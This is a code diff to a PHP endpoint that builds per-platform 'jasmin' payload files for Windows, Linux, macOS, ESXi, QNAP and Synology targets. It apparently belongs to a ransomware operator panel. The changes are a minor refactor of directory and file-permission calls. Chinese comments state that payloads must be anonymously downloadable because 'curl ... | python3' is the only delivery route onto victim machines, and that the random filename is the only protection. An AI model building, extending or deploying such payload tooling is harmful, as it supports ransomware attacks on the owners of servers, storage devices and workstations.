@@ -4,6 +4,7 @@
  */
 require_once __DIR__ . '/includes/auth.php';
 require_once __DIR__ . '/includes/csrf.php';
+require_once __DIR__ . '/includes/platform.php';
 require_auth();
 header('Content-Type: application/json');
 
@@ -43,7 +44,7 @@ $valid = ['win','linux','macos','esxi','qnap','synology'];
 if (!in_array($platform, $valid, true)) { echo json_encode(['ok'=>false,'msg'=>'无效平台']); exit; }
 
 $out_dir = __DIR__ . '/payloads';
-if (!is_dir($out_dir)) mkdir($out_dir, 0750, true);
+if (!is_dir($out_dir)) make_directory($out_dir, 0750, true);
 $ts = date('Ymd_His');
 // 载荷必须能匿名下载（受害机器上无法登录，'curl ... | python3' 是唯一投递路径），
 // 所以文件名本身就是唯一屏障：时间戳可枚举，熵全部来自这里。
@@ -100,7 +101,7 @@ if (in_array($platform, ['esxi','qnap','synology'], true)) {
 $name = "jasmin_{$platform}_{$ts}_{$tok}" . $ext_map[$platform];
 $path = "{$out_dir}/{$name}";
 file_put_contents($path, $tpl);
-if ($platform !== 'win') chmod($path, 0750);
+set_file_permissions($path, 0750);
 echo json_encode(['ok'=>true,'file'=>$name,'platform'=>$platform,'size'=>filesize($path)]);
 exit;
 
